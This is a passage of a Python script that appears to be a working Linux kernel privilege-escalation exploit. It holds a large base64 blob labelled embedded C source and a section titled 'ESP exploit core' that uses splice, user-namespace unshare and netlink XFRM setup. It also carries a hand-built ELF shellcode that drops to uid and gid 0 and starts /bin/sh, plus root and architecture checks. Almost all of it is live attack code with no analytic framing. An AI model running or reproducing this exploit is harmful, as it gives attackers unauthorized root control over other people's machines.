        "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",
]

EMBEDDED_C = "".join(EMBEDDED_C_LINES)

# ===================== PURE PYTHON ESP EXPLOIT CORE =====================

_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_loff_t_p = ctypes.POINTER(ctypes.c_longlong)

def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
    _libc.splice.restype = ctypes.c_long
    _libc.splice.argtypes = [ctypes.c_int, _loff_t_p, ctypes.c_int, _loff_t_p,
                             ctypes.c_size_t, ctypes.c_int]
    oi = ctypes.c_longlong(off_in) if off_in is not None else None
    oo = ctypes.c_longlong(off_out) if off_out is not None else None
    r = _libc.splice(fd_in, ctypes.byref(oi) if oi is not None else None,
                     fd_out, ctypes.byref(oo) if oo is not None else None,
                     length, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

SYS_unshare = 272
CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000

def _syscall(nr, *args):
    _libc.syscall.restype = ctypes.c_long
    ca = [ctypes.c_long(a) for a in args]
    _libc.syscall.argtypes = [ctypes.c_long] * (1 + len(ca))
    r = _libc.syscall(ctypes.c_long(nr), *ca)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def sys_unshare(flags):
    return _syscall(SYS_unshare, flags)

AF_NETLINK = 16
AF_INET = 2
SOCK_DGRAM = 2
IPPROTO_UDP = 17
NETLINK_XFRM = 6
UDP_ENCAP = 100
UDP_ENCAP_ESPINUDP = 2
XFRM_MSG_NEWSA = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4
IPPROTO_ESP = 50
XFRM_MODE_TRANSPORT = 0
XFRM_STATE_ESN = 0x80
XFRMA_ALG_AUTH_TRUNC = 20
XFRMA_ALG_CRYPT = 2
XFRMA_ENCAP = 4
XFRMA_REPLAY_ESN_VAL = 23
ENC_PORT = 4500
SEQ_VAL = 200
REPLAY_SEQ = 100
PATCH_OFFSET = 0
PAYLOAD_LEN = 192
ENTRY_OFFSET = 0x78
SPLICE_F_MOVE = 1

SHELL_ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])

PASSWD_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])

VERBOSE = False

def LOG(fmt, *a):
    print("[+] " + fmt % a, file=sys.stderr)

def WARN(fmt, *a):
    print("[!] " + fmt % a, file=sys.stderr)

def DBG(fmt, *a):
    if VERBOSE:
        print("[.] " + fmt % a, file=sys.stderr)

def INFO(fmt, *a):
    print("[INFO] " + fmt % a)

# ===================== SMART DETECTION =====================

def check_root():
    return os.geteuid() == 0

def check_arch():
    machine = platform.machine().lower()
    return machine in ("x86_64", "amd64")

def get_kernel_version():
    ver = platform.release()
